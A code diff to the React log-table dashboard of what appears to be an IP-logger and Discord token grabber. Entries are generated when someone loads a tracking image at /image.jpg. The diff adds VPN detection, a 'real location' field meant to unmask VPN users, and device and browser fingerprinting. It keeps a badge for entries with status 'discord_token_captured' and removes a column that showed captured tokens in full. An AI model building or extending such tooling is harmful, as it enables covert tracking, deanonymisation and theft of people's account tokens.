@@ -14,7 +14,13 @@ interface IpLog {
   timestamp: string;
   location: string;
   status: string;
-  tokens?: string; // Added tokens field
+  isVpn?: string;
+  vpnLocation?: string;
+  realLocation?: string;
+  deviceType?: string;
+  browserName?: string;
+  operatingSystem?: string;
+  deviceBrand?: string;
 }
 
 interface LogsResponse {
@@ -35,7 +41,11 @@ export default function LogTable() {
   const filteredLogs = data?.logs.filter(log => 
     log.ipAddress.toLowerCase().includes(search.toLowerCase()) ||
     log.userAgent.toLowerCase().includes(search.toLowerCase()) ||
-    (log.tokens && log.tokens.toLowerCase().includes(search.toLowerCase())) // Include token search
+    log.location.toLowerCase().includes(search.toLowerCase()) ||
+    (log.deviceType && log.deviceType.toLowerCase().includes(search.toLowerCase())) ||
+    (log.browserName && log.browserName.toLowerCase().includes(search.toLowerCase())) ||
+    (log.operatingSystem && log.operatingSystem.toLowerCase().includes(search.toLowerCase())) ||
+    (log.deviceBrand && log.deviceBrand.toLowerCase().includes(search.toLowerCase()))
   ) || [];
 
   const totalPages = Math.ceil((data?.total || 0) / logsPerPage);
@@ -81,7 +91,7 @@ export default function LogTable() {
               <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
               <Input
                 type="text"
-                placeholder="Search IP, User Agent, or Tokens..."
+                placeholder="Search IP, Location, Device, Browser..."
                 value={search}
                 onChange={(e) => setSearch(e.target.value)}
                 className="pl-10 w-64 bg-input border-border text-foreground placeholder-muted-foreground"
@@ -101,19 +111,17 @@ export default function LogTable() {
           <thead className="bg-muted/50">
             <tr>
               <th className="p-4 text-left text-sm font-medium text-muted-foreground">Timestamp</th>
-              <th className="p-4 text-left text-sm font-medium text-muted-foreground">IP Address</th>
-              <th className="p-4 text-left text-sm font-medium text-muted-foreground">User Agent</th>
-              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Referrer</th>
+              <th className="p-4 text-left text-sm font-medium text-muted-foreground">IP & VPN Status</th>
               <th className="p-4 text-left text-sm font-medium text-muted-foreground">Location</th>
+              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Device Info</th>
+              <th className="p-4 text-left text-sm font-medium text-muted-foreground">User Agent</th>
               <th className="p-4 text-left text-sm font-medium text-muted-foreground">Status</th>
-              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Tokens</th> {/* Added Tokens header */}
-              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Timestamp</th>
             </tr>
           </thead>
           <tbody className="divide-y divide-border">
             {filteredLogs.length === 0 ? (
               <tr>
-                <td colSpan={8} className="p-8 text-center text-muted-foreground"> {/* Adjusted colSpan */}
+                <td colSpan={6} className="p-8 text-center text-muted-foreground">
                   No log entries found. Start by accessing /image.jpg to generate logs.
                 </td>
               </tr>
@@ -123,17 +131,47 @@ export default function LogTable() {
                   <td className="p-4 text-sm text-foreground" data-testid={`text-timestamp-${log.id}`}>
                     {formatTimestamp(log.timestamp)}
                   </td>
-                  <td className="p-4 text-sm font-mono text-foreground" data-testid={`text-ip-${log.id}`}>
-                    {log.ipAddress}
-                  </td>
-                  <td className="p-4 text-sm max-w-xs truncate text-foreground" data-testid={`text-user-agent-${log.id}`}>
-                    {truncateUserAgent(log.userAgent)}
-                  </td>
-                  <td className="p-4 text-sm text-foreground" data-testid={`text-referrer-${log.id}`}>
-                    {log.referrer || '-'}
+                  <td className="p-4" data-testid={`text-ip-${log.id}`}>
+                    <div className="flex flex-col space-y-1">
+                      <span className="text-sm font-mono text-foreground">{log.ipAddress}</span>
+                      {log.isVpn === 'yes' ? (
+                        <Badge variant="destructive" className="text-xs w-fit">
+                          🛡️ VPN DETECTED
+                        </Badge>
+                      ) : (
+                        <Badge variant="outline" className="text-xs w-fit">
+                          ✅ Direct
+                        </Badge>
+                      )}
+                    </div>
                   </td>
                   <td className="p-4 text-sm text-foreground" data-testid={`text-location-${log.id}`}>
-                    {log.location}
+                    <div className="flex flex-col space-y-1">
+                      <span>{log.location}</span>
+                      {log.isVpn === 'yes' && log.realLocation && (
+                        <span className="text-xs text-muted-foreground">Real: {log.realLocation}</span>
+                      )}
+                    </div>
+                  </td>
+                  <td className="p-4 text-sm" data-testid={`text-device-${log.id}`}>
+                    <div className="flex flex-col space-y-1">
+                      <div className="flex items-center space-x-2">
+                        <span className="text-xs bg-secondary text-secondary-foreground px-2 py-1 rounded">
+                          {log.deviceType || 'Unknown'}
+                        </span>
+                        <span className="text-xs text-muted-foreground">
+                          {log.deviceBrand || 'Unknown'}
+                        </span>
+                      </div>
+                      <div className="flex items-center space-x-2 text-xs text-muted-foreground">
+                        <span>{log.operatingSystem || 'Unknown'}</span>
+                        <span>•</span>
+                        <span>{log.browserName || 'Unknown'}</span>
+                      </div>
+                    </div>
+                  </td>
+                  <td className="p-4 text-sm max-w-xs truncate text-foreground" data-testid={`text-user-agent-${log.id}`}>
+                    {truncateUserAgent(log.userAgent, 40)}
                   </td>
                   <td className="p-4" data-testid={`status-${log.id}`}>
                     <Badge 
@@ -141,20 +179,8 @@ export default function LogTable() {
                               log.status === 'discord_token_captured' ? 'destructive' : 'secondary'}
                       className="text-xs"
                     >
-                      {log.status === 'discord_token_captured' ? '🔥 DISCORD TOKEN' : log.status}
+                      {log.status === 'discord_token_captured' ? '🔥 TOKEN' : log.status}
                     </Badge>
-                  </td>
-                  <td className="p-4 text-sm"> {/* Added cell for tokens */}
-                    {log.tokens ? (
-                      <div className="max-w-xs truncate bg-red-50 dark:bg-red-950 text-red-700 dark:text-red-300 p-1 rounded border">
-                        {log.tokens.includes('DISCORD TOKEN') ? '🔥 ' : ''}{log.tokens}
-                      </div>
-                    ) : (
-                      <span className="text-muted-foreground">None</span>
-                    )}
-                  </td>
-                  <td className="p-4 text-sm text-muted-foreground" data-testid={`text-timestamp-${log.id}`}> {/* Moved timestamp here */}
-                    {new Date(log.timestamp).toLocaleString()}
                   </td>
                 </tr>
               ))
@@ -172,7 +198,7 @@ export default function LogTable() {
             variant="outline"
             size="sm"
             onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
-            disabled={currentPage === 1}
+            disabled={currentPage === 1 || !data?.total}
             className="border-border"
             data-testid="button-previous-page"
           >
@@ -205,7 +231,7 @@ export default function LogTable() {
             variant="outline"
             size="sm"
             onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}
-            disabled={currentPage === totalPages}
+            disabled={currentPage === totalPages || !data?.total}
             className="border-border"
             data-testid="button-next-page"
           >
